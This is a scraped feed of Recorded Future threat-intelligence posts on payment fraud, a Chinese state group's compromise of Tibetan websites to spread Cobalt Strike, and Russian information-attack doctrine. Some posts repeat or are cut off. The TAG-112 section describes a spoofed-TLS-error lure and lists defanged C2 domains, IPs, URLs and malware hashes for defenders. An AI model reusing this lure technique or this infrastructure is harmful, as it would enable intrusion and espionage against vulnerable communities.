risk-scoring solutions\nConduct CPP (common point of purchase) analysis before chargeback data arrives\n\n\nA Telegram-sourced conversation - courtesy of Recorded Future - regarding defeating fraud detection mechanisms.\nCommonly used fraud controls include KYC (Know Your Customer) rules, test transaction monitoring (a strong fraud precursor signal), CAMS (Compromised Account Management Systems) alerts, and CPP (common point of purchase) analysis. The issue is that all of these controls are reactive. CTI, when done well, changes the paradigm in that intelligence is proactively driving fraud prevention, reducing the efficacy of fraudster tactics, and traditional fraud controls become deprecated as a first line of defense. \nExample Beta - PII & ATO\n\nRecorded Future AI insights and cashout service branding.\nSome organizations (e.g., retailers) may not issue payment cards, but experience heavy fraud losses due to the unauthorized access of personally identifiable information (in the U.S., valuable PII for fraud may include: physical address, email address, date of birth, social security number, phone number, mothers maiden name, etc.), which is subsequently used to tailor social engineering attacks that lead to account takeover (ATO). This is also true for banks. A stolen payment card may be quickly identified and re-issued, but the associated stolen PII may lead to fraud losses through call center social engineering and/or online channel security bypass. The unauthorized access to online accounts may lead to unauthorized money movement to mules who specialize in maintaining bank accounts to receive stolen funds and cash out.\nIn another life, working with banks, we engaged fraudsters online to identify previously dormant cash-out accounts. At the time, even if a victim wasnt participating in online account access, fraudsters would enroll victims using stolen PII and create the necessary authentication details (username, password, etc.). Out of convenience, all compromised accounts contained the same password. \nATO mechanisms include MFA prompt fatigue (the victim is tired of selecting no and seeing a dialogue prompt reappear), credential stuffing / brute forcing, social engineering, SIM swapping, password resets, etc. Naturally, GenAI is reducing the time to prepare and deliver while increasing the quality of social engineering campaigns. ATO and associated cashout techniques are constantly changing. Fraud professionals collaborating with CTI will help identify the right threat actors for engagement to further intelligence objectives that lead to fraud control improvements. \n\nAn infostealer coterie - Lumma, Vidar, Raccoon, Redline.\nAdditionally, infostealers (a specific label for a malware genus focused on extracting all victim PII and more from web browsers) have stolen billions of victim credentials, cookie values, and more. This data treasure trove enables fraudsters to use valid credentials and quickly achieve ATO for both social engineering and direct money movement in financial services platforms.\n\nRecorded Future AI Insights for ATO channels.\nFocused Examples\nExample Charlie - Magecart Compromised Merchants\nMagecart is the label for specific malicious scripts (code) loaded into vulnerable e-commerce platforms to skim payment card details during customer payment. As previously mentioned, Magecart victims may have to consider more than just replacing their payment cards in certain shopping contexts. \n\nA Magecart data flow diagram.\n\nDetails of e-skimmer code illustrating customer fields for exfiltration.\nProactive Magecart intelligence is important for e-commerce retailers and financial services companies advising and alerting retailers, specifically small and medium-sized companies with fewer resources to invest in security. Magecart TTP evolutions require corresponding agile detections. Several historical Magecart operating changes observed by Recorded Futures Payment Fraud Intelligence (PFI) team include:\n\nUsing Google Tag Manager\nPayment card data exfiltration to Telegram \nHiding malicious scripts within SVG elements and using stenography\nUsing compromised websites as proxies to distribute malicious payloads\n\n\nFraud teams can track the monetization paths and timelines post-compromise, while CTI teams can actively help identify magecart-victimized merchants before the monetization clock starts. \nExample Delta - Scam Merchants\n\nA verified scam retail website.\nA comprehensive strategy to uncover scam merchants involves open-source research, collaboration with industry partners, and advanced data analysis. Organizations can source suspicious websites by monitoring social media advertisements, reviewing domain registration details, and investigating patterns in merchant account behavior. Further validation of potential scam websites can be achieved by correlating domain data with cards exposed on the dark web, identifying common patterns across fraudulent sites, and leveraging consumer reports of suspicious activity. By integrating these insights, organizations can avoid emerging threats and effectively mitigate payment fraud risks.\nExample Echo - Android Banking Trojans\n\nMobile malware is particularly pernicious in retail banking geographies outside of North America. Recorded Future observes thousands of malicious files with anti-virus signature names like Hydra, Hook, Sova, and more every quarter. For example, Thailand has been alerting citizens to the dangers of installing unverified Android applications, which could drain their bank accounts. While mobile malware generally contains many features (e.g., accessing location services, camera snooping, reading/sending SMS, etc.) that achieve device takeover (DTO), creating man-in-the-browser (MitB) capabilities during online banking sessions is the most impactful for fraud losses because traditional multi-factor authentication (MFA) mechanisms become less effective when all communications channels can be intercepted and manipulated, leading to account takeover (ATO). \nAgain, while financial services fraud teams and government investigators have digital exhaust to follow after victimization, CTI teams should create alerts and dissect new mobile malware TTPs to better educate the banking and online shopping public (and pursue attribution). \n\nA sample of malware tags derived from Hatching Triage.\nAdditionally, real-time notification of new mobile malware samples with associated meta-data improves bank prevention/detection systems via atomic indicators (e.g., user-agent strings, IP addresses, etc.) and internal log correlation. \nExample Foxtrot - Stolen Checks\nPhysical (paper) checks are a relic of the banking system employed primarily in North America. Because these documents contain a routing and account number, they are still heavily used in fraud. Older generations are vulnerable as they may prefer checks for a reliable payment mechanism over other fintech options, which are perceived as potentially less reliable. \nThe CTI opportunity is to use optical character recognition (OCR) for check image recognition in online criminal communities and proactively work with a fraud team to neutralize the inevitable fraud before victims report it. \n\nStolen checks are shared in an online criminal community.\nConclusion\nStrong leadership, clear expectations, and success measures are prerequisites for cyber-fraud fusion centers. By better understanding these complimentary workflows in:\n\nPayment card theft \nE-commerce skimming\nPhysical checks\nMobile malware\nAccount takeover (ATO) and cash-out\nScam merchants\n\nfraud and CTI resources (human or machine) can better architect and deliver improved organizational fraud loss value. \nThank you to Recorded Futures Payment Fraud Intelligence (PFI) team and Insikt Group for their foundational work in enabling this blog and their continued excellence in malicious cyber fraud campaign analysis.","enclosure":{"url":"https://cms.recordedfuture.com/uploads/9530ea14_3d82_4c7a_beac_a3260db82f1b_1024x1024_1284675518.webp","length":"0","type":"image/webp"},"content":"From Magecart to Mobile Menaces","contentSnippet":"From Magecart to Mobile Menaces","guid":"https://www.recordedfuture.com/blog/the-need-for-cyber-fraud-fusion-centers","categories":["Blog"],"isoDate":"2024-11-19T00:00:00.000Z","tag":"intel"},{"title":"Russian Sabotage Activities Escalate Amid Fraught Tensions","link":"https://www.recordedfuture.com/research/russian-sabotage-activities-escalate-amid-fraught-tensions","pubDate":"Thu, 14 Nov 2024 00:00:00 GMT","content:encoded":"<p><img src=\"https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png\" alt=\"insikt-group-logo-updated-3-300x48.png\"></p><h2 id=\"summary\">Summary</h2><p>Russia is likely ramping up its sabotage operations across Europe, targeting critical infrastructure to destabilize NATO allies and disrupt their support for Ukraine.

Recorded Futures Insikt Group discovered that the attackers embedded malicious JavaScript in these sites, which spoofed a TLS certificate error to trick visitors into downloading a disguised security certificate. This malware, often used by threat actors for remote access and post-exploitation, highlights a continued cyber-espionage focus on Tibetan entities. TAG-112s infrastructure, concealed using Cloudflare, links this campaign to other China-sponsored operations, particularly TAG-102 (Evasive Panda).</p><hr><h2 id=\"china-based-tag-112-compromises-tibetan-websites-to-distribute-cobalt-strike\">China-Based TAG-112 Compromises Tibetan Websites to Distribute Cobalt Strike</h2><p>Cyberattacks targeting ethnic and religious minority groups in China continue, with new developments pointing to a targeted campaign against Tibetan organizations. In a recent investigation, Recorded Futures Insikt Group discovered a Chinese state-sponsored threat actor group, designated TAG-112, responsible for compromising Tibetan community websites and delivering Cobalt Strike, a potent cyber-espionage tool.</p><h2 id=\"key-findings\">Key Findings</h2><p>In late May 2024, TAG-112 compromised at least two Tibetan community websites: Tibet Post (tibetpost[.]net) and Gyudmed Tantric University (gyudmedtantricuniversity[.]org). The attackers exploited vulnerabilities in the Joomla content management system (CMS) used by these sites to implant malicious JavaScript. This JavaScript prompted visitors to download a fake security certificate, which, when opened, deployed the Cobalt Strike payload.</p><p>TAG-112s infrastructure shows notable overlap with TAG-102 (<a href=\"https://therecord.media/china-based-hackers-evasive-isps-malware\">Evasive Panda</a>), a more sophisticated Chinese state-sponsored group known for targeting Tibetan entities. However, Insikt Group has identified TAG-112 as a separate entity due to differences in attack maturity and tactics, such as using Cobalt Strike rather than custom malware and foregoing JavaScript obfuscation.</p><h3 id=\"malicious-javascript-and-spoofed-tls-error\">Malicious JavaScript and Spoofed TLS Error</h3><p>The attack begins with the malicious JavaScript embedded in the compromised websites. When a user visits one of these sites, the script detects the operating system and browser type, confirming compatibility with Windows. If compatible, the script initiates a connection with TAG-112s command-and-control (C2) domain, update[.]maskrisks[.]com, which then returns an HTML page spoofing a legitimate TLS certificate error.</p><p>This spoofed error page is crafted to mimic Google Chromes TLS certificate warning, deceiving users into clicking a link to &quot;download a security certificate.&quot; Upon clicking, users unknowingly initiate the download of <a href=\"https://www.recordedfuture.com/blog/detect-cobalt-strike-inside-look\">Cobalt Strike</a>, a legitimate tool commonly used by security testers but often exploited by attackers for remote access and command execution.</p><h3 id=\"exploiting-website-vulnerabilities\">Exploiting Website Vulnerabilities</h3><p>TAG-112 likely gained access to the compromised Tibetan websites through vulnerabilities in Joomla, a popular CMS. Websites built on Joomla are frequently targeted by attackers if they are not adequately maintained and updated. Likely by exploiting these weaknesses, TAG-112 was able to upload the malicious JavaScript file, which remains active on these sites as of early October 2024.</p><h3 id=\"infrastructure-and-obfuscation-tactics\">Infrastructure and Obfuscation Tactics</h3><p>TAG-112s infrastructure shows a level of sophistication in concealing its origins. The group used Cloudflare to shield its servers&#39; IP addresses, complicating efforts to trace the infrastructure back to its origin. Insikt Group identified multiple IP addresses linked to TAG-112s C2 servers, some active as early as March 2024. The primary domain, maskrisks[.]com, was registered in March 2024 through Namecheap, with subdomains such as mail[.]maskrisks[.]com and checkupdate[.]maskrisks[.]com added for further operational flexibility.</p><h3 id=\"tag-112s-use-of-cobalt-strike\">TAG-112s Use of Cobalt Strike</h3><p>Cobalt Strike is a commercial penetration testing tool that has become a favorite among threat actors due to its versatility and powerful capabilities for remote access, lateral movement, and command-and-control. Insikt Group identified six distinct Cobalt Strike Beacon samples linked to TAG-112, with their C2 communication directed to mail[.]maskrisks[.]com. This malware enables TAG-112 to monitor and control compromised systems, gathering intelligence and potentially leveraging these infected systems for further espionage activities.</p><h3 id=\"connections-to-tag-102-evasive-panda\">Connections to TAG-102 (Evasive Panda)</h3><p>TAG-112 shares several operational characteristics with TAG-102 (Evasive Panda), another <a href=\"https://www.recordedfuture.com/research/chinese-cyberespionage-operations\">Chinese APT known for targeting the Tibetan community</a>. Both groups have used similar methods, including spoofed error pages to deliver malicious files. However, TAG-112s operations are less sophisticated than TAG-102, indicating that it may be a subgroup or less experienced branch. For instance, while TAG-102 has deployed customized malware and used obfuscation techniques, TAG-112 relies on the readily available Cobalt Strike tool without obfuscating its JavaScript.</p><p>Despite the lack of obfuscation, TAG-112s tactics and overlaps with TAG-102 highlight the Chinese governments ongoing interest in Tibetan and other ethnic and religious minority communities. Such campaigns are part of a broader strategy of surveillance and control, targeting groups perceived as threats to the stability and control of the Chinese Communist Party (CCP).</p><h3 id=\"mitigation-recommendations\">Mitigation Recommendations</h3><p>TAG-112s campaign underscores the importance of proactive cybersecurity measures, particularly for organizations that may be high-value targets for state-sponsored actors. Recorded Future recommends the following steps:</p><ol><li><strong>Intrusion Detection and Prevention</strong>: Configure intrusion detection (IDS) and intrusion prevention systems (IPS) to alert on any indicators of compromise (IoCs) associated with TAG-112. Consider blocking connections to known TAG-112 infrastructure after a thorough review.</li><li><strong>User Training</strong>: Educate users to exercise caution when handling files downloaded from untrusted sources.

Recorded Futures Insikt Group discovered that the attackers embedded malicious JavaScript in these sites, which spoofed a TLS certificate error to trick visitors into downloading a disguised security certificate. This malware, often used by threat actors for remote access and post-exploitation, highlights a continued cyber-espionage focus on Tibetan entities. TAG-112s infrastructure, concealed using Cloudflare, links this campaign to other China-sponsored operations, particularly TAG-102 (Evasive Panda).\n\nChina-Based TAG-112 Compromises Tibetan Websites to Distribute Cobalt Strike\nCyberattacks targeting ethnic and religious minority groups in China continue, with new developments pointing to a targeted campaign against Tibetan organizations. In a recent investigation, Recorded Futures Insikt Group discovered a Chinese state-sponsored threat actor group, designated TAG-112, responsible for compromising Tibetan community websites and delivering Cobalt Strike, a potent cyber-espionage tool.\nKey Findings\nIn late May 2024, TAG-112 compromised at least two Tibetan community websites: Tibet Post (tibetpost[.]net) and Gyudmed Tantric University (gyudmedtantricuniversity[.]org). The attackers exploited vulnerabilities in the Joomla content management system (CMS) used by these sites to implant malicious JavaScript. This JavaScript prompted visitors to download a fake security certificate, which, when opened, deployed the Cobalt Strike payload.\nTAG-112s infrastructure shows notable overlap with TAG-102 (Evasive Panda), a more sophisticated Chinese state-sponsored group known for targeting Tibetan entities. However, Insikt Group has identified TAG-112 as a separate entity due to differences in attack maturity and tactics, such as using Cobalt Strike rather than custom malware and foregoing JavaScript obfuscation.\nMalicious JavaScript and Spoofed TLS Error\nThe attack begins with the malicious JavaScript embedded in the compromised websites. When a user visits one of these sites, the script detects the operating system and browser type, confirming compatibility with Windows. If compatible, the script initiates a connection with TAG-112s command-and-control (C2) domain, update[.]maskrisks[.]com, which then returns an HTML page spoofing a legitimate TLS certificate error.\nThis spoofed error page is crafted to mimic Google Chromes TLS certificate warning, deceiving users into clicking a link to \"download a security certificate.\" Upon clicking, users unknowingly initiate the download of Cobalt Strike, a legitimate tool commonly used by security testers but often exploited by attackers for remote access and command execution.\nExploiting Website Vulnerabilities\nTAG-112 likely gained access to the compromised Tibetan websites through vulnerabilities in Joomla, a popular CMS. Websites built on Joomla are frequently targeted by attackers if they are not adequately maintained and updated. Likely by exploiting these weaknesses, TAG-112 was able to upload the malicious JavaScript file, which remains active on these sites as of early October 2024.\nInfrastructure and Obfuscation Tactics\nTAG-112s infrastructure shows a level of sophistication in concealing its origins. The group used Cloudflare to shield its servers' IP addresses, complicating efforts to trace the infrastructure back to its origin. Insikt Group identified multiple IP addresses linked to TAG-112s C2 servers, some active as early as March 2024. The primary domain, maskrisks[.]com, was registered in March 2024 through Namecheap, with subdomains such as mail[.]maskrisks[.]com and checkupdate[.]maskrisks[.]com added for further operational flexibility.\nTAG-112s Use of Cobalt Strike\nCobalt Strike is a commercial penetration testing tool that has become a favorite among threat actors due to its versatility and powerful capabilities for remote access, lateral movement, and command-and-control. Insikt Group identified six distinct Cobalt Strike Beacon samples linked to TAG-112, with their C2 communication directed to mail[.]maskrisks[.]com. This malware enables TAG-112 to monitor and control compromised systems, gathering intelligence and potentially leveraging these infected systems for further espionage activities.\nConnections to TAG-102 (Evasive Panda)\nTAG-112 shares several operational characteristics with TAG-102 (Evasive Panda), another Chinese APT known for targeting the Tibetan community. Both groups have used similar methods, including spoofed error pages to deliver malicious files. However, TAG-112s operations are less sophisticated than TAG-102, indicating that it may be a subgroup or less experienced branch. For instance, while TAG-102 has deployed customized malware and used obfuscation techniques, TAG-112 relies on the readily available Cobalt Strike tool without obfuscating its JavaScript.\nDespite the lack of obfuscation, TAG-112s tactics and overlaps with TAG-102 highlight the Chinese governments ongoing interest in Tibetan and other ethnic and religious minority communities. Such campaigns are part of a broader strategy of surveillance and control, targeting groups perceived as threats to the stability and control of the Chinese Communist Party (CCP).\nMitigation Recommendations\nTAG-112s campaign underscores the importance of proactive cybersecurity measures, particularly for organizations that may be high-value targets for state-sponsored actors. Recorded Future recommends the following steps:\n\nIntrusion Detection and Prevention: Configure intrusion detection (IDS) and intrusion prevention systems (IPS) to alert on any indicators of compromise (IoCs) associated with TAG-112. Consider blocking connections to known TAG-112 infrastructure after a thorough review.\nUser Training: Educate users to exercise caution when handling files downloaded from untrusted sources. Advise users against opening files that download automatically without input, as these could be part of phishing or drive-by download attacks.\nCobalt Strike Detection: Enable real-time monitoring for malicious Cobalt Strike C2 servers using threat intelligence modules such as Recorded Futures Intelligence Cloud.\nNetwork Monitoring: Regularly monitor network traffic for signs of compromise, particularly for connections to known threat infrastructure. Malicious Traffic Analysis (MTA) can help detect unusual activity, alerting security teams to potential C2 communications.\n\nOutlook\nTAG-112s operations against Tibetan organizations reflect a longstanding objective within Chinese cyber-espionage campaigns to monitor and control ethnic and religious minorities, especially those seen as potentially destabilizing. Other groups and regions with similar CCP-designated risk profiles are likely targets of similar state-sponsored attacks.\nTo read the entire analysis, click here to download the report as a PDF.\nAppendix A  Indicators of Compromise\n\nCompromised Websites:\ntibetpost[.]net\ngyudmedtantricuniversity[.]org\nC2 Domains:\nmaskrisks[.]com\nmail[.]maskrisks[.]com\nupdate[.]maskrisks[.]com\ncheckupdate[.]maskrisks[.]com\n\nC2 IP Addresses:\n154.90.62[.]12\n154.90.63[.]166\n154.205.138[.]202\nCertificates:\nd0972247c500d2a45f412f9434287161de395a35ef5b4931cba12cf513b76962(*[.]dnspod[.]cn)\n94569f64f62eff185ba47e991dba54bdeea6d1a9e205d6bec767be6a864e4efb (Cloudflare Origin *.maskrisks[.]com)\nd4938cb5c031ec7f04d73d4e75f5db5c8a5c04ce (Stolen code-signing certificate KP MOBILE)\nURLs of malicious JavaScript:\nhttps[:]//gyudmedtantricuniversity[.]org/templates/lt_interiordesign/js/custom.js\nhttps[:]//tibetpost[.]net/templates/ja_teline_v/js/gallery/jquery.blueimp-gallery.full.js\nMalicious URLs:\nhttps[:]//update[.]maskrisks[.]com/download \nhttps[:]//update[.]maskrisks[.]com/?type=Chrome\nhttps[:]//update[.]maskrisks[.]com/?type=Edge\nhttp[:]//mail[.]maskrisks[.]com/api/view.php\nhttp[:]//154.205.138[.]202/GetUrl/cache\nhttps[:]//checkupdate[.]maskrisks[.]com/cache\nhttps[:]//update[.]maskrisks[.]com/cache\nCobalt Strike:\n1e42cbe23055e921eff46e5e6921ff1a20bb903fca83ea1f1294394c0df3f4cd\n0e306c0836a8ee035ae739c5adfbe42bd5021e615ebaa92f52d5d86fb895651d\nf1f11e52a60e5a446f1eb17bb718358def4825342acc0a41d09a051359a1eb3d\nf4ded3a67480a0e2a822af1e87a727243dea16ac1a3c0513aec62bff71f06b27\n966d311dcc598922e4ab9ce5524110a8bfd2c6b6db540d180829ceb7a7253831\n1e7cb19f77206317c8828f9c3cdee76f2f0ebf7451a625641f7d22bb8c61b21b\nLoaders:\n8d4049ef70c83a6ead26736c1330e2783bdc9708c497183317fad66b818e44cb\nE190c7e097a1c38dd45d9c149e737ad9253b1cabee1cee7ef080ddf52d1b378c (legitimate software)\n31f11b4d81f3ae25b6a01cd1038914f31d045bc4136c40a6221944ea553d6414\n\n\n            \n\n\nAppendix B  Mitre ATT&CK Techniques\n\nTactic: TechniqueATT&CK Code\nResource Development: Acquire Infrastructure: ServerT1583.004\nResource Development: Acquire Infrastructure: Web ServicesT1583.006\nResource Development: Compromise Infrastructure: ServerT1584.004\nInitial Access: Drive-by CompromiseT1189\nDefense Evasion: Hijack Execution Flow: DLL Side-LoadingT1574.002","enclosure":{"url":"https://cms.recordedfuture.com/uploads/format_webp/cta_cn_2024_1112_Main_Feature_18ea548089.jpg","length":"0","type":"image/jpg"},"content":"China-based TAG-112 exploited Tibetan sites to spread Cobalt Strike malware.

Insikt Group acknowledges that SIA is not an official term used in Russian or Western defense parlance. Based on Russian doctrine, SIAs target adversaries through &quot;psychological attacks&quot; (influence operations) and &quot;technical attacks&quot; (cyberattacks) to exact strategic damage. While SIA is almost certainly reserved for large-scale war scenarios, it shares similarities with lower-intensity cyber and information attacks already observed in Western countries, such as targets. The goal of SIA is to employ strategic non-kinetic capabilities to escalate the conflict and force adversaries into negotiations on Moscows terms by causing significant infrastructure disruptions  aligned with Russias escalate to de-escalate conflict escalation management strategy. </p><h2 id=\"russian-strategic-information-attack-for-catastrophic-effect\">Russian Strategic Information Attack for Catastrophic Effect</h2><p>Non-kinetic warfare is emerging and evolving as a significant threat. One such tool in Russias arsenal is the SIA, a concept that blends psychological and technical tactics to disrupt and destabilize adversaries&#39; NCI. This Insikt Group report dives into the mechanics of Russias SIA, the strategy, doctrine, and policies that frame it, its potential targets, and why Western organizations must be vigilant.</p><h3 id=\"the-concept-of-sia\">The Concept of SIA</h3><p>Russias SIA concept involves employing non-kinetic methods, such as psychological attacks (influence operations) and technical attacks (cyberattacks), to damage or destroy NCI. This tactic is anchored, in concept, to Russias perception of how the United States historically used nuclear weapons in WWII to escalate the use of military means to compel its adversary to accept peace negotiations (de-escalation). The primary goal is to exact catastrophic damage to the adversary and weaken the enemys ability to sustain conflict, leading to negotiations that favor Russias terms.</p><p>In Russian doctrine, SIAs are framed by the Kremlins information confrontation strategy, which includes efforts to <a href=\"https://www.recordedfuture.com/research/russia-linked-copycop-uses-llms-to-weaponize-influence-content-at-scale\">manipulate information systems</a> and the publics perception. These attacks aim to undermine the target countrys political stability and NCI. Russia&#39;s view on information warfare treats cyberspace as both a battleground and a domain for strategic advantage.</p><h3 id=\"psychological-attacks-in-sia\">Psychological Attacks in SIA</h3><p>Psychological attacks focus on shaping adversaries&#39; perceptions and eroding trust in their leadership and institutions. By disseminating true and false information or exploiting existing societal tensions, Russia seeks to create widespread chaos and unrest. In times of heightened conflict, these attacks can drive public panic, leading to political instability. For instance, Russian defense analysts propose the malicious use of artificial intelligence (MUAI) could lead to <a href=\"https://www.recordedfuture.com/blog/deepfakes-id-verification\">deepfake videos</a> impersonating key leaders, further exacerbating societal concerns or divisions.</p><p>Historically, Russia has demonstrated expertise in influence operations. Soviet-era active measures aimed at <a href=\"https://www.recordedfuture.com/research/russian-information-operations-divide-western-coalition-ukraine\">destabilizing Western countries</a> are now updated with modern techniques, including the use of AI-generated content. Russian military theorists have outlined scenarios in which information could cause societal collapse, with analysts predicting that such tactics could be used to provoke a second Civil War in the United States.</p><h3 id=\"technical-attacks-in-sia\">Technical Attacks in SIA</h3><p>On the technical side, SIA encompasses sophisticated cyberattacks designed to disrupt or destroy NCI. These attacks could target communication systems, power grids, financial infrastructure, or government networks. In contrast to typical cyberattacks, which might cause short-term damage, strategic cyberattacks aim for long-lasting, widespread effects.</p><p>During <a href=\"https://www.recordedfuture.com/research/themes-failures-russias-war-against-ukraine\">Russias war in Ukraine</a>  which is not characterized as a large-scale war in Russias official military doctrine , <a href=\"https://www.recordedfuture.com/research/dark-covenant-2-cybercrime-russian-state-war-ukraine\">cyberattacks were a major component of the Kremlins strategy</a>. However, these attacks were focused on specific tactical objectives, rather than full-scale strategic destruction. If Russia were to initiate an SIA during a large-scale war, it would almost certainly be aimed at critical infrastructure that directly supports both civilian and military operations, causing significant damage and forcing the adversary to acquiesce to Moscows demands.</p><h3 id=\"strategic-targets-soviet-era-and-modern-targeting-methodologies\">Strategic Targets: Soviet-era and Modern Targeting Methodologies</h3><p>To frame Russian SIA, Insikt Group cited Soviet-era and modern Russian targeting concepts. Defector Viktor Suvorov revealed a model that divided critical infrastructure into categories such as the brain (national leadership), nervous system (national communications), heart and blood supply (national energy infrastructure), and teeth (nuclear weapons capabilities).

Insikt Group acknowledges that SIA is not an official term used in Russian or Western defense parlance. Based on Russian doctrine, SIAs target adversaries through \"psychological attacks\" (influence operations) and \"technical attacks\" (cyberattacks) to exact strategic damage. While SIA is almost certainly reserved for large-scale war scenarios, it shares similarities with lower-intensity cyber and information attacks already observed in Western countries, such as targets. The goal of SIA is to employ strategic non-kinetic capabilities to escalate the conflict and force adversaries into negotiations on Moscows terms by causing significant infrastructure disruptions  aligned with Russias escalate to de-escalate conflict escalation management strategy. \nRussian Strategic Information Attack for Catastrophic Effect\nNon-kinetic warfare is emerging and evolving as a significant threat. One such tool in Russias arsenal is the SIA, a concept that blends psychological and technical tactics to disrupt and destabilize adversaries' NCI. This Insikt Group report dives into the mechanics of Russias SIA, the strategy, doctrine, and policies that frame it, its potential targets, and why Western organizations must be vigilant.\nThe Concept of SIA\nRussias SIA concept involves employing non-kinetic methods, such as psychological attacks (influence operations) and technical attacks (cyberattacks), to damage or destroy NCI. This tactic is anchored, in concept, to Russias perception of how the United States historically used nuclear weapons in WWII to escalate the use of military means to compel its adversary to accept peace negotiations (de-escalation). The primary goal is to exact catastrophic damage to the adversary and weaken the enemys ability to sustain conflict, leading to negotiations that favor Russias terms.\nIn Russian doctrine, SIAs are framed by the Kremlins information confrontation strategy, which includes efforts to manipulate information systems and the publics perception. These attacks aim to undermine the target countrys political stability and NCI. Russia's view on information warfare treats cyberspace as both a battleground and a domain for strategic advantage.\nPsychological Attacks in SIA\nPsychological attacks focus on shaping adversaries' perceptions and eroding trust in their leadership and institutions. By disseminating true and false information or exploiting existing societal tensions, Russia seeks to create widespread chaos and unrest. In times of heightened conflict, these attacks can drive public panic, leading to political instability. For instance, Russian defense analysts propose the malicious use of artificial intelligence (MUAI) could lead to deepfake videos impersonating key leaders, further exacerbating societal concerns or divisions.\nHistorically, Russia has demonstrated expertise in influence operations. Soviet-era active measures aimed at destabilizing Western countries are now updated with modern techniques, including the use of AI-generated content. Russian military theorists have outlined scenarios in which information could cause societal collapse, with analysts predicting that such tactics could be used to provoke a second Civil War in the United States.\nTechnical Attacks in SIA\nOn the technical side, SIA encompasses sophisticated cyberattacks designed to disrupt or destroy NCI. These attacks could target communication systems, power grids, financial infrastructure, or government networks. In contrast to typical cyberattacks, which might cause short-term damage, strategic cyberattacks aim for long-lasting, widespread effects.\nDuring Russias war in Ukraine  which is not characterized as a large-scale war in Russias official military doctrine , cyberattacks were a major component of the Kremlins strategy. However, these attacks were focused on specific tactical objectives, rather than full-scale strategic destruction. If Russia were to initiate an SIA during a large-scale war, it would almost certainly be aimed at critical infrastructure that directly supports both civilian and military operations, causing significant damage and forcing the adversary to acquiesce to Moscows demands.\nStrategic Targets: Soviet-era and Modern Targeting Methodologies\nTo frame Russian SIA, Insikt Group cited Soviet-era and modern Russian targeting concepts. Defector Viktor Suvorov revealed a model that divided critical infrastructure into categories such as the brain (national leadership), nervous system (national communications), heart and blood supply (national energy infrastructure), and teeth (nuclear weapons capabilities). While this model primarily applied to kinetic operations, it aligns with Russias modern cyber capabilities, where attacks could focus on these same vital systems.\nRussias doctrine of escalate to de-escalate refers to the use of efforts to force an adversary to negotiate. This strategy is typically associated with Russias nuclear arsenal but applies equally to strategic cyber capabilities. By launching an SIA against NCI, Russia seeks to create enough pressure on adversary governments to achieve its geopolitical objectives without resorting to strategic kinetic means  such as mass conventional or nuclear weapons strikes.\nRussias modern military doctrine, Strategic Operations for the Destruction of Critically Important Targets (SODCIT), outlines a similar approach for targeting NCI in a way that limits civilian casualties while exerting pressure on national governments. The intent is to force adversaries into negotiations by threatening critical infrastructure without causing mass casualties.\nThe dual approach of psychological and technical attacks allows Russia to customize its targeting. In some cases, psychological attacks alonesuch as influence operationsare intended to erode trust and create enough chaos to disrupt governance. In other cases, technical attacks target an adversarys ability to communicate or distribute power. Psychological and technical attacks can also have overlapping effects, such as influence operations that undermine faith and confidence in the financial sector that coincide with technical attacks against financial networks. \nOutlook\nWestern countries, particularly those managing critical infrastructure, must prepare for potential Russian SIAs. The risks posed by these attacks are substantial, but public and private entities can take steps to mitigate them. \nOrganizations need to improve cybersecurity defenses, including monitoring for signs of psychological attacks. Collaboration between governments, private enterprises, and cybersecurity experts will be crucial in identifying and mitigating these threats. Exercises and simulations, such as red teaming, can help organizations test their readiness for potential attacks. Industry leaders must consider incorporating scenarios that mirror Russias SIAs to strengthen defenses and identify vulnerabilities.\nTo read the entire analysis, click here to download the report as a PDF.","enclosure":{"url":"https://cms.recordedfuture.com/uploads/format_webp/BLOG_ta_ru_2024_1024_Platform_Notes_336c81d874.jpg","length":"0","type":"image/jpg"},"content":"Explore Russia’s strategic information attack (SIA) concept, blending psychological and cyber tactics to target critical infrastructure in large-scale warfare.","contentSnippet":"Explore Russia’s strategic information attack (SIA) concept, blending psychological and cyber tactics to target critical infrastructure in large-scale warfare.","guid":"https://www.recordedfuture.com/research/russian-strategic-information-attack-catastrophic-effect","categories":["Research (Insikt)"],"isoDate":"2024-10-24T00:00:00.000Z","tag":"intel"},{"title":"Operation Overload Impersonates Media to Influence 2024 US Election","link":"https://www.recordedfuture.com/research/operation-overload-impersonates-media-influence-2024-us-election","pubDate":"Wed, 23 Oct 2024 00:00:00 GMT","content:encoded":"<p><img src=\"https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png\" alt=\"insikt-group-logo-updated-3-300x48.png\"></p><h2 id=\"summary\">Summary</h2><p>Operation Overload, a Russia-aligned influence operation, is aggressively targeting the 2024 US presidential election.

For the uninitiated, riz roughly translates to charisma (if you have a young teenager at home, ask them for a definition of rizzler and enjoy the confused expression resulting from your breach of their world). However, in business, we should co-opt riz as shorthand for resilience, particularly for those in the security industry. Riz represents the ability to withstand attacks, minimize damage, and quickly recover, ensuring business continuity. In security, riz requires consuming intelligence, inspecting existing controls, and addressing identified gaps (where appropriate). \nComplexity and resilience have a nuanced relationship  resilience often increases with complexity up to a point, but too much complexity erodes riz, making systems fragile and harder to defend.

And while $1.1 billion is a staggering sum, it represents only the amount of money that companies and individuals have publicly disclosed.\nRansomware isnt a new issue for businesses, but despite increased security spending, hackers are emboldened and attacks are on the rise. Here are a few more eye-watering stats:\n\nRansomware dwell time decreased to just 24 hours. (Cybermagazine)\n48% of ransomware victims in the last 12 months suffered reputational damage and lost customers. (Delinea)\n2024 has seen a 180% increase in the exploitation of vulnerabilities for initial access. (2024 Verizon DBIR)\nTheres been a 68% year-over-year increase in breaches resulting from a third party, and thats mainly due to software vulnerabilities exploited in ransomware and extortion attacks. (2024 Verizon DBIR)\n\nSecurity teams are struggling to proactively identify attacks in the early stages, and teams often lack visibility into ransomware exposures across their entire ecosystem  people, vendors, suppliers, and more. Thats why on the main stage at Predict 2024, Recorded Future is excited to announce enhanced capabilities in the Ransomware Mitigation solution and workflow within our Threat Intelligence Module.\nSupporting Our Clients in the Fight Against Ransomware\nRecorded Futures Ransomware Mitigation offering has always encompassed Threat Intelligence, Identity Intelligence, and Attack Surface intelligence. Its made up of the following components:\n\n\nThreat Intelligence | Ransomware Dashboard and Intelligence Cards. This Dashboard displays threat information from our Insikt Group as well as dark web extortion sites, allowing clients to filter by ransomware group, industry, country, and TTPs to find relevant threats. Intelligence Cards  provide a deeper look into specific threat actors and the malware theyre deploying.\nIdentity Intelligence | Credential Search Capabilities. Clients can search for exposed credentials by login details, malware used, and initial access brokers   and instantly trigger automated remediation workflows with a single click.\nAttack Surface Intelligence | Remote 